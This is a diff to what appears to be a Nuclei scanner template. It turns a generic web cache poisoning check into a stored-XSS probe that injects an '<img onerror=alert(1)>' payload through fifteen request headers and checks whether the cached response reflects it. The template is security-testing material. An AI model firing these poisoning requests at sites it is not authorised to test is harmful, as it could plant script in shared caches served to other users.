@@ -1,43 +1,50 @@
-id: cache-poisoning-3
+id: cache-poisoning-xss
 
 info:
-  name: Cache Poisoning Detection
-  author: erickfernandox
-  severity: low
-  tags: cache,generic
+  name: Cache Poisoning - Stored XSS
+  author: melbadry9,xelkomy,akincibor
+  severity: high
+  description: Cache Poisoning leads to Stored XSS.
+  reference:
+    - https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning
+    - https://portswigger.net/research/practical-web-cache-poisoning
+    - https://portswigger.net/web-security/web-cache-poisoning
   metadata:
-    max-request: 3
-
+    max-request: 2
+  tags: cache,generic,xss
 variables:
   cache_key: "{{to_lower(rand_base(6))}}"
   cache_header: "{{to_lower(rand_base(6))}}"
+  xss_payload: '"><img src=x onerror=alert(1)>'
 
 http:
   - raw:
       - |
-        GET /?{{cache_key}}=10 HTTP/1.1
-        Host: {{Hostname}}        
-        X-Ads: {{cache_header}}.xfaa
-        x-aol-domain: {{cache_header}}.xfab
-        X-API-Auth: {{cache_header}}.xfac
-        x-api-gateway: {{cache_header}}.xfad
-        x-api-key: {{cache_header}}.xfae
-        X-ApiKey: {{cache_header}}.xfaf
-        X-Api-Language: {{cache_header}}.xfag
-        X-api-search-elastic: {{cache_header}}.xfah
-        x-api-signature: {{cache_header}}.xfai
-        x-api-timestamp: {{cache_header}}.xfaj
-        X-Api-Token: {{cache_header}}.xfak
-        x-apitoken: {{cache_header}}.xfal
-        x-api-version: {{cache_header}}.xfam
-        X-app: {{cache_header}}.xfan
-        X-AppAdvice-Client: {{cache_header}}.xfao
+        GET /?{{cache_key}}=1 HTTP/1.1
+        Host: {{Hostname}}
+        X-Ads: {{cache_header}}.xfaa{{xss_payload}}
+        x-aol-domain: {{cache_header}}.xfab{{xss_payload}}
+        X-API-Auth: {{cache_header}}.xfac{{xss_payload}}
+        x-api-gateway: {{cache_header}}.xfad{{xss_payload}}
+        x-api-key: {{cache_header}}.xfae{{xss_payload}}
+        X-ApiKey: {{cache_header}}.xfaf{{xss_payload}}
+        X-Api-Language: {{cache_header}}.xfag{{xss_payload}}
+        X-api-search-elastic: {{cache_header}}.xfah{{xss_payload}}
+        x-api-signature: {{cache_header}}.xfai{{xss_payload}}
+        x-api-timestamp: {{cache_header}}.xfaj{{xss_payload}}
+        X-Api-Token: {{cache_header}}.xfak{{xss_payload}}
+        x-apitoken: {{cache_header}}.xfal{{xss_payload}}
+        x-api-version: {{cache_header}}.xfam{{xss_payload}}
+        X-app: {{cache_header}}.xfan{{xss_payload}}
+        X-AppAdvice-Client: {{cache_header}}.xfao{{xss_payload}}
 
       - |
-        GET /?{{cache_key}}=10 HTTP/1.1
+        GET /?{{cache_key}}=1 HTTP/1.1
         Host: {{Hostname}}
 
     matchers:
       - type: dsl
         dsl:
-          - 'contains(body_2, cache_header)'
+          - contains(body_2, cache_header)
+          - contains(body_2, xss_payload)
+        condition: and
